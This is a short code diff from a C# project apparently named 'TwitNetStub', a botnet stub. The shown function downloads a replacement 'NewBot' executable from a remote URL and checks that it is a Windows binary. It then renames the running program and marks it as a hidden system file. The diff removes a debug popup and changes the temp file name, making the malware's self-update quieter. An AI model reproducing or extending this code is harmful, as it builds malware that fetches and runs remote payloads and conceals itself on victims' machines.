@@ -25,16 +25,15 @@ namespace TwitNetStub.Operations
             byte[] NewBot = new System.Net.WebClient().DownloadData(MainURL);
             if (NewBot[0] != 77 | NewBot[1] != 90) //starts with MZ?
             {
-                MessageBox.Show(NewBot[0].ToString() + NewBot[1].ToString());
                 return;
             }
 
-            if (File.Exists("temp.1"))
-                File.Delete("temp.1");
-            File.Move(Application.ExecutablePath, "temp.1");
-            File.SetAttributes("temp.1", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
+            if (File.Exists("temp.tmp"))
+                File.Delete("temp.tmp");
+            File.Move(Application.ExecutablePath, "temp.tmp");
+            File.SetAttributes("temp.tmp", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
 
-            while (!File.Exists("temp.1"))
+            while (!File.Exists("temp.tmp"))
             { Application.DoEvents(); }
 
 
